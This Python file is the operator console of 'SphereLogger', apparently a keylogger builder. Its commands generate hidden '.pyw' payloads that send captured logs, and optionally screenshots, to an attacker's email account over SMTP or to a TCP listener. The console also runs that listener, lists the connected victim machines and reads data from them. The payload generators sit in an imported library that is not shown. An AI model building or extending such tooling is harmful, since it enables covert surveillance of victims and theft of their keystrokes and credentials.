# -*- coding: utf-8 -*-

from SPLib import c_blue, c_green, c_magenta, c_red, c_yellow, \
    logo, send_test_mail, Listener, generate_mail, \
    generate_tcp, get_end, get_green


from socket import gethostname, gethostbyname

import cmd
import prettytable
import sys


class SphereShell(cmd.Cmd):

    prompt = c_magenta('>> ')
    doc_leader = ''
    nohelp = 'No help on "%s"'
    license = 'https://github.com/Emberium/SphereLogger'

    def __init__(self, config=None):

        print(c_yellow(logo))
        print(c_magenta('Welcome to SphereLogger! Type "help" to get available commands!'))

        self.config = config
        self.listener = None
        self.payload_types = ['mail', 'tcp']

        super().__init__()

    def do_help(self, arg):
        """List available commands with "help" or detailed help with "help cmd"."""

        print(get_green(), end='')
        super().do_help(arg)
        print(get_end(), end='')

    def do_license(self, line):
        """Shows licence."""
        print(c_blue("License on " + self.license))

    def do_start_tcp(self, port):
        """Starts tcp listener (start_tcp <port>)."""
        if not port.isdigit():
            print(c_red('Incorrect port.'))

        else:
            if self.listener is None:
                print(c_green('Starting listener...'))
                print(c_green('SERVER(PORT) -> ' + port))
                self.listener = Listener(int(port))
                self.listener.start_listener()
                print(c_green('Server started!'))

            else:
                print(c_green('Closing socket...'))
                self.listener.exit = True
                self.listener.socket.close()
                print(c_green('Starting listener...'))
                self.listener = Listener(int(port))

    def do_read(self, line):
        """Reads connection."""

        if self.listener is None:
            print(c_green('Use start_tcp to start listener.'))

        elif self.listener.conn is None:
            print(c_green('Use connect <ip> to connect.'))

        else:
            try:
                while True:

                    data = self.listener.listen()

                    if data is None:
                        continue

                    elif data['cmd'] == 'buffer':
                        print(c_blue('SAVED IN BUFFER:\n'+data['data']))

                    elif data['cmd'] == 'upd':
                        print(c_blue(data['data']))

            except KeyboardInterrupt:
                print(c_green('Closing listener...'))

            except Exception as e:
                print(c_red(e))

    def do_conns(self, line):
        """Connections list."""

        if self.listener is None:
            print(c_green('Use start_tcp to start listener.'))

        elif not self.listener.clients:
            print(c_green('No connected clients.'))

        else:
            table = prettytable.PrettyTable([c_yellow("No."), c_green("IP")])
            i = 1

            for client in self.listener.clients:
                table.add_row([c_yellow(str(i)), c_green(client)])
                i += 1

            print(table)

    def do_connect(self, ip):
        """Connects to client. connect <ip>"""

        if self.listener is None:
            print(c_green('Use start_tcp to start listener.'))

        elif ip not in self.listener.clients:
            print(c_green('Client not found.'))

        else:
            self.listener.conn = self.listener.clients[ip]
            print(c_green('CONNECTION -> ' + ip))

    def do_exit(self, t):
        """Exit."""
        if self.listener.thread is not None:
            print(c_green('Stopping server...'))
            self.listener.exit = True

        print(c_green('Thanks for using Sphere Logger!'))

        return True

    def check_config(self):

        login = self.config.get('MAIL', 'Login')
        password = self.config.get('MAIL', 'Password')
        server = self.config.get('MAIL', 'Server')
        port = self.config.get('MAIL', 'Port')
        receiver = self.config.get('MAIL', 'Receiver')

        if login != 'None' and password != 'None' and server != 'None' and port != 'None' and \
                        receiver != 'None':

            return login, password, server, port, receiver

        return False

    def do_gen(self, line):
        """Generates payload. gen <type>. Allowed types: mail"""

        screen_logger = False

        if line not in self.payload_types:
            print(c_red('Unknown type: %s' % line))

        elif line == 'tcp':
            ip = input(c_green('Your ip (Press Enter to use %s):' % gethostbyname(gethostname())))

            if not ip:
                ip = gethostbyname(gethostname())

            port = input(c_green('Server\'s port: '))

            if not port.isdigit():
                print(c_red('Incorrect port.'))
                return

            file = input(c_green('Enter output filename: '))

            if not (file.endswith('.py') or file.endswith('.pyw')):
                file += '.pyw'

            generate_tcp(host=ip, port=port, output=file)

            print(c_green('Generation successful. Payload saved as "%s"' % ('output/' + file)))

        elif line == 'mail':

            settings = False

            defaults = self.check_config()
            if defaults:
                if input(c_green('Do you want to load settings from config? (Y/n): ')).upper() == 'Y':
                    login, password, server, port, rc = defaults
                    settings = True

                else:
                    login = input(c_green('Sender mail address: '))
                    password = input(c_green('Sender\'s password: '))
                    server = input(c_green('SMTP Server: '))
                    port = input(c_green('SMTP Port: '))
                    rc = input(c_green('Receiver\'s mail address: '))

            else:
                login = input(c_green('Sender mail address: '))
                password = input(c_green('Sender\'s password: '))
                server = input(c_green('SMTP Server: '))
                port = input(c_green('SMTP Port: '))
                rc = input(c_green('Receiver\'s mail address: '))

            if not port.isdigit():
                print(c_red('Incorrect port.'))
                return

            if input(c_green('Do you want to send test mail? (Y/n)')).upper() == 'Y':
                if not send_test_mail(login, password, server, rc, port):
                    print(c_red('Sending Error!'))
                    return

                else:
                    print(c_blue('Sending successful! Check your mail!'))

            if input(c_green('Do you want to send screen shots with logs? (Y/n)')).upper() == 'Y':
                screen_logger = True

            file = input(c_green('Output filename: '))

            if not (file.endswith('.py') or file.endswith('.pyw')):
                file += '.pyw'

            generate_mail(
                login=login,
                password=password,
                server=server,
                port=port,
                receiver=rc,
                output=file,
                screen_logger=screen_logger
            )

            if not settings:
                if input(c_green('Do you want to save settings to config? (Y/n): ')).upper() == 'Y':
                    self.config.set("MAIL", "Login", login)
                    self.config.set("MAIL", "Password", password)
                    self.config.set("MAIL", "Server", server)
                    self.config.set("MAIL", "Port", port)
                    self.config.set("MAIL", "Receiver", rc)

                    with open('config.ini', 'w') as config_file:
                        self.config.write(config_file)

            print(c_green('Generation successful. Payload saved as "%s"' % ('output/' + file)))

    def default(self, line):
        self.stdout.write(c_red('Unknown syntax: %s.\n' % line))
